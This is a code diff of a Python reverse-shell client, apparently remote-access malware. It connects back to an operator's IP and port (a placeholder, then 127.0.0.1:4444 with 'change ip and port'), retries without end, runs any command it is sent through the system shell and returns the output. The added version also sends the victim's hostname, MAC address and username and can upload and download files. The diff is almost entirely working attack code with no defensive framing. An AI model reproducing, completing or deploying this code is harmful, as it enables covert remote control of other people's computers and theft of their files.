@@ -1,56 +1,76 @@
+import json
 import os
+import platform
 import socket
 import subprocess
 import time
-import json
-IP = 'put ip here'  #change ip also
-PORT =  4444             #change port also
-BUFFER_SIZE = 4096
+import uuid
 def send_data(data):
-    json_data = json.dumps(data)
-    json_data_bytes = json_data.encode()
-    data_length = len(json_data_bytes).to_bytes(4, byteorder='big')
-    s.sendall(data_length)
-    for i in range(0, len(json_data_bytes), BUFFER_SIZE):
-        chunk = json_data_bytes[i:i + BUFFER_SIZE]
-        s.sendall(chunk)
-def recv_data():
-    data_length_bytes = s.recv(4)
-    data_length = int.from_bytes(data_length_bytes, byteorder='big')
-    json_data_bytes = b""
-    bytes_received = 0
-    while bytes_received < data_length:
-        chunk = s.recv(min(BUFFER_SIZE, data_length - bytes_received))
-        json_data_bytes += chunk
-        bytes_received += len(chunk)
+    jsondata = json.dumps(data)
+    sock.send(jsondata.encode())
 
-    json_data = json_data_bytes.decode()
-    data = json.loads(json_data)
-    return data
+def recv_data():
+    data = ''
+    while True:
+        try:
+            data = data + sock.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    sock.settimeout(1)
+    chunk = sock.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = sock.recv(1024)
+        except socket.timeout as e:
+            break
+    sock.settimeout(None)
+    f.close()
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    sock.send(f.read())
+def get_hostname():
+    hostname = socket.gethostname()
+    return hostname
+def shell(sock):
+    hostname = get_hostname()
+    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
+                for ele in range(0, 8 * 6, 8)][::-1])
+    he = os.environ.get("USER") or os.environ.get("USERNAME")
+    data = f"{hostname},{mac_address},{he}"
+    send_data(data)
+    while True:
+        command = recv_data()
+        if command == 'q':
+            continue
+        elif command[:6] == 'upload':
+            download_file(command[7:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command == 'kill':
+            sock.close()
+            break
+        elif command == 'cd ..':
+            os.chdir('..')
+            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
+        elif command.startswith('cd '):
+            foldername = command[3:]
+            os.chdir(foldername)
+            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
+        else:
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            ab = result.decode('utf-8')
+            send_data(ab)
 while True:
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            while True:
-                try:
-                    s.connect((IP, PORT))
-                    break
-                except ConnectionRefusedError:
-                    time.sleep(5)
-            while True:
-                command = recv_data()
-                if not command:
-                    break
-                elif command == 'cd ..':
-                    os.chdir('..')
-                    send_data(f"Current directory changed to: {os.getcwd()}")
-                elif command.startswith('cd '):
-                    foldername = command[3:]
-                    os.chdir(foldername)
-                    send_data(f"Current directory changed to: {os.getcwd()}")
-                else:
-                    result = subprocess.run(command, shell=True, capture_output=True)
-                    output = result.stdout.decode()
-                    send_data(output)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(('127.0.0.1', 4444)) #change ip and port
+        shell(sock)
     except Exception as e:
-        time.sleep(5)
-
+        time.sleep(2)
